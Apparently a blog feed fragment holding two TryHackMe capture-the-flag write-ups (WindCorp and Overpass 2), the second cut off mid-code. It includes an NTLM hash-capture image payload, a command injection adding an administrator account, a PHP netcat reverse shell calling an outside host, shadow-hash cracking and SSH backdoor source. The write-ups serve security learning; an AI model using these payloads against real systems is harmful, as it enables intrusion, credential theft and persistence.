+</code></pre><p><img src="/curlingusers.png" alt="curlingusers"></p>
+<p>we can see the names pop up in some email addresses, but towards the end we can see the names pop up in what appear to be some images. the image that caught my eye was <strong>lilyleAndSparky.jpg</strong>.</p>
+<p><img src="/employees.png" alt="employees"></p>
+<p><img src="/employees2.png" alt="employees2"></p>
+<p>could this be the key to resetting the password? we have a username: lilyle (lily levesque) and the name &ldquo;sparky&rdquo; (probably her dog&rsquo;s name). one of the security questions was &ldquo;what is/was your favorite pets name?&rdquo;. let&rsquo;s try it.</p>
+<p><img src="/lilylepassword.png" alt="lilylepassword"></p>
+<p>wow, it actually worked. which is good, because if it didn&rsquo;t i would really not know what to do next and would have to rethink my whole attack.</p>
+<p>armed with these credentials (lilyle:ChangeMe#1234), let&rsquo;s enumerate the SMB shares and try to log into one of them.</p>
+<pre tabindex="0"><code>smbclient -L 10.10.75.59 -U lilyle
+</code></pre><p>enter the password when prompted.</p>
+<p>we can also use:</p>
+<pre tabindex="0"><code>smbmap -u lilyle -p ChangeMe#1234 -H windcorp.thm
+</code></pre><p><img src="/smbenumeration.png" alt="smbenumeration"></p>
+<p>let&rsquo;s try to login to the &ldquo;Shared&rdquo; share.</p>
+<pre tabindex="0"><code>smbclient \\\\10.10.75.59\\Shared -U lilyle --password ChangeMe#1234
+</code></pre><p><img src="/smblogin+flag1.png" alt="smblogin"></p>
+<p>we can see there&rsquo;s a flag stored right there, along with installers for an application called &ldquo;spark&rdquo;.</p>
+<p>let&rsquo;s download both the flag, and the .deb installer.</p>
+<pre tabindex="0"><code>get &#34;Flag 1.txt&#34;
+get spark_2_8_3.deb
+</code></pre><p>if the installer is too big for your network connection, the connection will timeout. in that case, you can try <code>curl</code>:</p>
+<pre tabindex="0"><code>curl -u &#34;windcorp.thm\lilyle:ChangeMe#1234&#34; smb://windcorp.thm/Shared/spark_2_8_3.deb
+</code></pre><p>this didn&rsquo;t work for me either, so i tried to download and install the tarball package (spark_2_8_3.tar.gz). when that also didn&rsquo;t work, i ended up finding an installer on the internet and just downloaded then installed that. the version difference in this case didn&rsquo;t matter, but in a real-life scenario, versions are often very important, and some exploits don&rsquo;t work with later versions of applications.</p>
+<p>once you&rsquo;ve downloaded spark, try to get some info on the package.</p>
+<pre tabindex="0"><code>dpkg-deb -I spark_2_8_3.deb
+</code></pre><p><img src="/sparkinfo.png" alt="sparkinfo"></p>
+<p>it&rsquo;s a &ldquo;cross-platform real-time collaboration client optimized for business and organizations&rdquo;.</p>
+<p>basically, it&rsquo;s an IM client or chat app.</p>
+<p>when it&rsquo;s installed, try to use the credentials lilyle:ChangeMe#1234 to log in.</p>
+<p>the login fails, because the app wasn&rsquo;t able to verify the certificate. no matter, because we can go into the advanced settings of the app and select the option &ldquo;accept all certificates&rdquo; and disable &ldquo;certificate hostname verification&rdquo;.</p>
+<p>now, we can log in.</p>
+<p>we see there&rsquo;s a conference room, but no one is in it. the app looks pretty empty.</p>
+<p><img src="/spark_room.png" alt="spark_room"></p>
+<p><img src="/sparkempty.png" alt="sparkempty"></p>
+<p>when dealing with apps like this, it&rsquo;s good practice to start searching vuln databases to see if any exploit exists. a good place to check is <a href="https://attackerkb.com/">https://attackerkb.com/</a></p>
+<p>searching for &ldquo;spark exploits&rdquo; leads us to CVE-2020-12772.</p>
+<p><img src="/attackerkb.png" alt="attackerkb"></p>
+<p>in a nutshell, this exploit allows us to send an &ldquo;image&rdquo; to a contact, but the SRC attribute of the image will refer our IP address. when the contact clicks this link, their hashes will be sent with the HTTP request. to receive this data, we&rsquo;ll need to run Responder.py.</p>
+<p>now we need to select a target. if you remember, the site had a list of technical staff and their status (online/offline). going back to the site, we see that the user &ldquo;buse&rdquo; is online. let&rsquo;s target them.</p>
+<p>first, run responder:</p>
+<pre tabindex="0"><code>/opt/Responder/Responder.py
+</code></pre><p>now, send the following &ldquo;image&rdquo; to buse:</p>
+<pre tabindex="0"><code>&lt;img src=&#34;http://10.9.6.194/bilal.jpg&gt;
+</code></pre><p>wait for buse to click the link&hellip;</p>
+<p><img src="/responder.png" alt="responder"></p>
+<p><img src="/sparkexploit.png" alt="sparkexploit"></p>
+<p>we receive a hash, in the NTLMv2 format. hopefully, we can crack it with hashcat (and rockyou.txt):</p>
+<pre tabindex="0"><code>hashcat.exe -a 0 -m 5600 &#34;buse::WINDCORP:1122334455667788:96320659CCC8CCD0C23852F82AA669C8:0101000000000000792F24210DCCD701CB9891E68DB963FB000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C000800300030000000000000000100000000200000B25F9F074A7F2B076C71892C3D7F9B988260CA42BCBEB4E1863C7810B3FF276D0A00100000000000000000000000000000000000090000000000000000000000&#34; C:\rockyou.txt
+</code></pre><p>upon a successful crack, we&rsquo;ll get the password <code>uzunLM+3131</code>. great! now we have another set of credentials &ndash; buse:uzunLM+3131</p>
+<p>note: i do recommend saving found/cracked credentials in a text file. that way we&rsquo;re not constantly scrolling through terminal trying to find them.</p>
+<pre tabindex="0"><code>echo &#34;buse:uzunLM+3131&#34; &gt; creds.txt
+</code></pre><p>now we get to use one of my favourite tools ever: <a href="https://kalilinuxtutorials.com/evil-winrm-hacking-pentesting/">evil winrm</a>. if you don&rsquo;t know, evil winrm is basically the go-to tool, sometimes used by sysadmins but mostly by hackers, to remotely access a windows machine. it&rsquo;s extremely useful in the post-exploitation phase.</p>
+<pre tabindex="0"><code>evil-winrm -u buse -p uzunLM+3131 -i windcorp.thm
+</code></pre><p>this will log us in as buse, and upon poking around, you&rsquo;ll locate the 2nd flag.</p>
+<p>what&rsquo;s more interesting though, and which proves to eventually be vital in privilege escalation, is a folder in C:\ that contains a powershell script and its log.</p>
+<p><img src="/busescripts.png" alt="busescripts"></p>
+<p>the code for the checkservers.ps1 script is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># reset the lists of hosts prior to looping</span>
+</span></span><span style="display:flex;"><span>$OutageHosts = $Null
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the time you want email notifications resent for hosts that are down</span>
+</span></span><span style="display:flex;"><span>$EmailTimeOut = <span style="color:#ae81ff">30</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the time you want to cycle through your host lists.</span>
+</span></span><span style="display:flex;"><span>$SleepTimeOut = <span style="color:#ae81ff">45</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the maximum hosts that can be down before the script is aborted</span>
+</span></span><span style="display:flex;"><span>$MaxOutageCount = <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify who gets notified</span>
+</span></span><span style="display:flex;"><span>$notificationto = <span style="color:#e6db74">&#34;brittanycr@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify where the notifications come from</span>
+</span></span><span style="display:flex;"><span>$notificationfrom = <span style="color:#e6db74">&#34;admin@windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># specify the SMTP server</span>
+</span></span><span style="display:flex;"><span>$smtpserver = <span style="color:#e6db74">&#34;relay.windcorp.thm&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># start looping here</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">Do</span>{
+</span></span><span style="display:flex;"><span>$available = $Null
+</span></span><span style="display:flex;"><span>$notavailable = $Null
+</span></span><span style="display:flex;"><span>Write-Host (Get-Date)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Read the File with the Hosts every cycle, this way to can add/remove hosts</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># from the list without touching the script/scheduled task,</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># also hash/comment (#) out any hosts that are going for maintenance or are down.</span>
+</span></span><span style="display:flex;"><span>get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;#&#34;</span>)} |
+</span></span><span style="display:flex;"><span>ForEach-Object {
+</span></span><span style="display:flex;"><span>    $p = <span style="color:#e6db74">&#34;Test-Connection -ComputerName </span>$_<span style="color:#e6db74"> -Count 1 -ea silentlycontinue&#34;</span>
+</span></span><span style="display:flex;"><span>    Invoke-Expression $p
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($p)
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#75715e"># if the Host is available then just write it to the screen</span>
+</span></span><span style="display:flex;"><span>     write-host <span style="color:#e6db74">&#34;Available host ---&gt; &#34;</span>$_ -BackgroundColor Green -ForegroundColor White
+</span></span><span style="display:flex;"><span>     [<span style="color:#66d9ef">Array</span>]$available += $_
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>     <span style="color:#75715e"># If the host is unavailable, give a warning to screen</span>
+</span></span><span style="display:flex;"><span>     write-host <span style="color:#e6db74">&#34;Unavailable host ------------&gt; &#34;</span>$_ -BackgroundColor Magenta -ForegroundColor White
+</span></span><span style="display:flex;"><span>     $p = Test-Connection -ComputerName $_ -Count <span style="color:#ae81ff">1</span> -ea silentlycontinue
+</span></span><span style="display:flex;"><span>     <span style="color:#66d9ef">if</span>(!($p))
+</span></span><span style="display:flex;"><span>       {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># If the host is still unavailable for 4 full pings, write error and send email</span>
+</span></span><span style="display:flex;"><span>        write-host <span style="color:#e6db74">&#34;Unavailable host ------------&gt; &#34;</span>$_ -BackgroundColor Red -ForegroundColor White
+</span></span><span style="display:flex;"><span>        [<span style="color:#66d9ef">Array</span>]$notavailable += $_
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($OutageHosts <span style="color:#f92672">-ne</span> $Null)
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> (!$OutageHosts.ContainsKey($_))
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                 <span style="color:#75715e"># First time down add to the list and send email</span>
+</span></span><span style="display:flex;"><span>                 Write-Host <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> Is not in the OutageHosts list, first time down&#34;</span>
+</span></span><span style="display:flex;"><span>                 $OutageHosts.Add($_,(get-date))
+</span></span><span style="display:flex;"><span>                 $Now = Get-date
+</span></span><span style="display:flex;"><span>                 $Body = <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> has not responded for 5 pings at </span>$Now<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                 Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>                  -Subject <span style="color:#e6db74">&#34;Host </span>$_<span style="color:#e6db74"> is down&#34;</span> -SmtpServer $smtpserver
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>                {
+</span></span><span style="display:flex;"><span>                    <span style="color:#75715e"># If the host is in the list do nothing for 1 hour and then remove from the list.</span>
+</span></span><span style="display:flex;"><span>                    Write-Host <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> Is in the OutageHosts list&#34;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes <span style="color:#f92672">-gt</span> $EmailTimeOut)
+</span></span><span style="display:flex;"><span>                    {$OutageHosts.Remove($_)}
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>            {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># First time down create the list and send email</span>
+</span></span><span style="display:flex;"><span>                Write-Host <span style="color:#e6db74">&#34;Adding </span>$_<span style="color:#e6db74"> to OutageHosts.&#34;</span>
+</span></span><span style="display:flex;"><span>                $OutageHosts = @{$_=(get-date)}
+</span></span><span style="display:flex;"><span>                $Body = <span style="color:#e6db74">&#34;</span>$_<span style="color:#e6db74"> has not responded for 5 pings at </span>$Now<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>                Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>                 -Subject <span style="color:#e6db74">&#34;Host </span>$_<span style="color:#e6db74"> is down&#34;</span> -SmtpServer $smtpserver
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Report to screen the details</span>
+</span></span><span style="display:flex;"><span>$log = <span style="color:#e6db74">&#34;Last run: </span>$(Get-Date)<span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>write-host $log
+</span></span><span style="display:flex;"><span>Set-Content -Path C:\scripts\log.txt -Value $log
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Available count:&#34;</span>$available.count
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Not available count:&#34;</span>$notavailable.count
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Not available hosts:&#34;</span>
+</span></span><span style="display:flex;"><span>$OutageHosts
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Write-Host <span style="color:#e6db74">&#34;Sleeping </span>$SleepTimeOut<span style="color:#e6db74"> seconds&#34;</span>
+</span></span><span style="display:flex;"><span>sleep $SleepTimeOut
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($OutageHosts.Count <span style="color:#f92672">-gt</span> $MaxOutageCount)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># If there are more than a certain number of host down in an hour abort the script.</span>
+</span></span><span style="display:flex;"><span>    $Exit = $True
+</span></span><span style="display:flex;"><span>    $body = $OutageHosts | Out-String
+</span></span><span style="display:flex;"><span>    Send-MailMessage -Body <span style="color:#e6db74">&#34;</span>$body<span style="color:#e6db74">&#34;</span> -to $notificationto -from $notificationfrom `
+</span></span><span style="display:flex;"><span>     -Subject <span style="color:#e6db74">&#34;More than </span>$MaxOutageCount<span style="color:#e6db74"> Hosts down, monitoring aborted&#34;</span> -SmtpServer $smtpServer
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> ($Exit <span style="color:#f92672">-ne</span> $True)
+</span></span></code></pre></div><p>it looks like this code is checking the status of some hosts every 1 minute, from a file stored at <code>C:\Users\brittanycr\hosts.txt</code>.</p>
+<p>when we try to read brittanycr&rsquo;s directories, our access is denied.</p>
+<p><img src="/brittanycr.png" alt="brittanycr"></p>
+<p>if we run the command <code>whoami /groups</code> as buse, we&rsquo;ll see that buse is in the group &ldquo;account operators&rdquo;.</p>
+<p><img src="/whoamigroups.png" alt="whoamigroups"></p>
+<p>account operators can change passwords for other users, which means buse can change the password for brittanycr.</p>
+<pre tabindex="0"><code>net user brittanycr wEiRdP@$$W0rd1234! /domain
+</code></pre><p>(i chose this password because it complies with the password policy.)</p>
+<p>once the password has been changed, let&rsquo;s try to get that file at <code>C:\Users\brittanycr\hosts.txt</code>. since the checkservers.ps1 script reads from this file without being too annoying about checking what&rsquo;s in it, we&rsquo;re gonna inject a little bit of code into it and get the script to run it. this will be our ticket into getting root access.</p>
+<p>getting in:</p>
+<pre tabindex="0"><code>smbclient \\\\windcorp.thm\\Users -U brittanycr --password wEiRdP@$$W0rd1234!
+</code></pre><p>navigate to the folder above and download the hosts.txt file, then edit it to add the following bit of code:</p>
+<pre tabindex="0"><code>; net user bilal &#39;p*s$w0rd123&#39; /add; net localgroup Administrators bilal /add
+</code></pre><p><img src="/hosts.png" alt="hosts"></p>
+<p>when the script performs this little maneuver, it will inadvertently create a user &ldquo;bilal&rdquo;, and add me to the Administrators group heh heh.</p>
+<p>we have to replace the previous hosts.txt file with the new one. we can do this using the <code>upload</code> command in brittanycr&rsquo;s evil winrm instance.</p>
+<p>now if we navigate to buse&rsquo;s &ldquo;scripts&rdquo; folder, keep checking the log file to see if the script has been successfully run. it might be a bit of a wait, but if you&rsquo;re patient, you&rsquo;ll see the script will have run.</p>
+<p>we should now be able to access the network with our new (root) credentials.</p>
+<p><img src="/evilwinrmfail.png" alt="evilwinrmfail"></p>
+<p>hmmm, evil winrm is failing to log me in. maybe we can use another tool?</p>
+<p>first, i have to check if my credentials are actually root. to do this, let&rsquo;s use <a href="https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/">crackmapexec</a>, a badass tool that quickly assesses the security of large AD networks. if it says we have access, i&rsquo;ll use psexec.py to log in.</p>
+<pre tabindex="0"><code>crackmapexec smb windcorp.thm -u bilal -p &#39;p*s$w0rd123&#39;
+
+python3 /usr/share/doc/python3-impacket/examples/psexec.py bilal@windcorp.thm
+</code></pre><p><img src="/pwned.png" alt="pwned"></p>
+<p>hell yeah, <em>we&rsquo;re in</em>.</p>
+<p><img src="/rootflag.png" alt="rootflag"></p>
+<p>that was a hell of a ride. from doing a bit of recon on the company&rsquo;s users, sending fake links to IT, getting their hash then password, then injecting our own malicious code into a routine script to get root&hellip;i guess WindCorp isn&rsquo;t unhackable after all :)</p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>tryhackme: overpass2</title>
+            <link>/posts/2021/10/tryhackme-overpass2/</link>
+            <pubDate>Wed, 27 Oct 2021 16:16:04 +0400</pubDate>
+            
+            <guid>/posts/2021/10/tryhackme-overpass2/</guid>
+            <description>i&amp;rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &amp;ldquo;advanced exploitation&amp;rdquo; chapter, of the &amp;ldquo;offensive pentesting&amp;rdquo; path. it&amp;rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &amp;ldquo;overpass&amp;rdquo;.
+this room is interesting and different because the &amp;ldquo;target&amp;rdquo; in question has already been hacked, and it&amp;rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.</description>
+            <content type="html"><![CDATA[<p>i&rsquo;m going to talk about one of my favourite rooms on thm, and that is overpass 2. overpass 2 is the 7th room in the &ldquo;advanced exploitation&rdquo; chapter, of the &ldquo;offensive pentesting&rdquo; path. it&rsquo;s also the 2nd room in the overpass series, which is about a bunch of computer science students trying to run a company called &ldquo;overpass&rdquo;.</p>
+<p>this room is interesting and different because the &ldquo;target&rdquo; in question has already been hacked, and it&rsquo;s our job to figure out how and if we can use the information left behind by the attacker to get back into the overpass network.</p>
+<p><img src="/overpass-cooctus.png" alt="cooctus"></p>
+<p>the overpass SOC team managed to capture the packets in wireshark during the attack, and save them as a .pcap file. we&rsquo;ve been given the .pcap file to analyze, so let&rsquo;s go ahead and do that.</p>
+<p><img src="/overpass-pcap.png" alt=".pcap"></p>
+<p>this is what we first see when we open the file in wireshark. it&rsquo;s a lot of information, but we can see a bunch of TCP and HTTP requests made from a source (192.168.170.145) to a destination (192.168.170.159).</p>
+<p>let&rsquo;s set a display filter so we only see the HTTP requests. we can do this by entering <code>http</code> in the &ldquo;apply a display filter&rdquo; field.</p>
+<p><img src="/overpass-pcap2.png" alt="pcap2"></p>
+<p>we can see that the source (attacker?) requested the /development/ URL. the first packet has the <code>GET /development/</code> request header. the server responds, and then the source makes a POST request to an upload form of sorts (header <code>POST /development/upload.php</code>).</p>
+<p>if we right-click on the packet, and click &ldquo;follow TCP stream&rdquo;, it will show us the information that was contained within that packet.</p>
+<p><img src="/overpass-tcpstream.png" alt="stream"></p>
+<p>we can see that the source/attacker uploaded a .php file called &ldquo;payload.php&rdquo;. doesn&rsquo;t leave much to the imagination, does it? right under that, we can see the payload&rsquo;s code in clear text:</p>
+<pre tabindex="0"><code>&lt;?php exec(&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f&#34;)?&gt;
+</code></pre><p>this script would have created a php reverse shell, which the attacker would control using netcat. the shell would have connected to port 4242.</p>
+<p>the good (and bad) thing about using netcat to control reverse shells is that all the traffic is unencrypted, and should be visible in stream data that is captured.</p>
+<p>let&rsquo;s apply a TCP stream filter to see the contents of the traffic. in the display filter field, type <code>tcp.stream eq 3</code>.</p>
+<p><img src="/overpass-tcpstream2.png" alt="stream2"></p>
+<p><img src="/overpass-tcpstream3.png" alt="stream2"></p>
+<p>this stream has captured all the traffic that was traveling through the attacker&rsquo;s shell. we can see that they logged in as a low privilege user &ldquo;james&rdquo; and used the password &ldquo;whenevernoteartinstant&rdquo;. attacker then runs <code>sudo -l</code> to see what commands james can run, and turns out james can run pretty much anything. this means that james isn&rsquo;t exactly a low privilege user!</p>
+<p>the attacker then dumps the contents of the /etc/shadow file. this file, as you may know, contains all the secure user account information. it stores actual passwords&rsquo; hashes. we can see that some user hashes were dumped as well:</p>
+<pre tabindex="0"><code>james:$6$7GS5e.yv$HqIH5MthpGWpczr3MnwDHlED8gbVSHt7ma8yxzBM8LuBReDV5e1Pu/VuRskugt1Ckul/SKGX.5PyMpzAYo3Cg/:18464:0:99999:7:::
+paradox:$6$oRXQu43X$WaAj3Z/4sEPV1mJdHsyJkIZm1rjjnNxrY5c8GElJIjG7u36xSgMGwKA2woDIFudtyqY37YCyukiHJPhi4IU7H0:18464:0:99999:7:::
+szymex:$6$B.EnuXiO$f/u00HosZIO3UQCEJplazoQtH8WJjSX/ooBjwmYfEOTcqCAlMjeFIgYWqR5Aj2vsfRyf6x1wXxKitcPUjcXlX/:18464:0:99999:7:::
+bee:$6$.SqHrp6z$B4rWPi0Hkj0gbQMFujz1KHVs9VrSFu7AU9CxWrZV7GzH05tYPL1xRzUJlFHbyp0K9TAeY1M6niFseB9VLBWSo0:18464:0:99999:7:::
+muirland:$6$SWybS8o2$9diveQinxy8PJQnGQQWbTNKeb2AiSp.i8KznuAjYbqI3q04Rf5hjHPer3weiC.2MrOj2o1Sw/fd2cu0kC6dUP.:18464:0:99999:7:::
+</code></pre><p>we can attempt to crack these hashes using john. first, let&rsquo;s identify the hashes. you can use any tool you prefer. i used the hash-identifier tool on my machine. hopefully, you will be able to identify it as sha512crypt.</p>
+<p>save the hashes to a file, and run john to crack them using the following command:</p>
+<pre tabindex="0"><code>john -w=/usr/share/wordlists/fasttrack.txt --format=crypt systemhashes.txt
+</code></pre><p><img src="/overpass-john.png" alt="john"></p>
+<p>we were able to crack 4 users&rsquo; passwords.</p>
+<p>right after dumping the hashes, the attacker then tries to establish persistence via an SSH backdoor. they cloned a repo from github, known as <a href="https://github.com/NinjaJc01/ssh-backdoor">ssh-backdoor</a>. they then generate a public/private key pair. the attacker modifies the permissions on the backdoor using <code>chmod +x backdoor</code> and then login to it using:</p>
+<pre tabindex="0"><code>./backdoor -a 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed
+</code></pre><p>the backdoor connects over the port 2222.</p>
+<p>let&rsquo;s visit the github repo above and try to analyze the main code.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;crypto/sha512&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;fmt&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;io/ioutil&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;log&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;net&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;os/exec&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/creack/pty&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/gliderlabs/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/integrii/flaggy&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gossh</span> <span style="color:#e6db74">&#34;golang.org/x/crypto/ssh&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;golang.org/x/crypto/ssh/terminal&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">hash</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> (
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">lport</span>       <span style="color:#66d9ef">uint</span>   = <span style="color:#ae81ff">2222</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">lhost</span>       <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">IP</span> = <span style="color:#a6e22e">net</span>.<span style="color:#a6e22e">ParseIP</span>(<span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">keyPath</span>     <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;id_rsa&#34;</span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">fingerprint</span> <span style="color:#66d9ef">string</span> = <span style="color:#e6db74">&#34;OpenSSH_8.2p1 Debian-4&#34;</span>
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">UInt</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lport</span>, <span style="color:#e6db74">&#34;p&#34;</span>, <span style="color:#e6db74">&#34;port&#34;</span>, <span style="color:#e6db74">&#34;Local port to listen for SSH on&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">IP</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">lhost</span>, <span style="color:#e6db74">&#34;i&#34;</span>, <span style="color:#e6db74">&#34;interface&#34;</span>, <span style="color:#e6db74">&#34;IP address for the interface to listen on&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">keyPath</span>, <span style="color:#e6db74">&#34;k&#34;</span>, <span style="color:#e6db74">&#34;key&#34;</span>, <span style="color:#e6db74">&#34;Path to private key for SSH server&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">fingerprint</span>, <span style="color:#e6db74">&#34;f&#34;</span>, <span style="color:#e6db74">&#34;fingerprint&#34;</span>, <span style="color:#e6db74">&#34;SSH Fingerprint, excluding the SSH-2.0- prefix&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">String</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">hash</span>, <span style="color:#e6db74">&#34;a&#34;</span>, <span style="color:#e6db74">&#34;hash&#34;</span>, <span style="color:#e6db74">&#34;Hash for backdoor&#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flaggy</span>.<span style="color:#a6e22e">Parse</span>()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">SetPrefix</span>(<span style="color:#e6db74">&#34;SSH - &#34;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">privKeyBytes</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">ioutil</span>.<span style="color:#a6e22e">ReadFile</span>(<span style="color:#a6e22e">keyPath</span>)
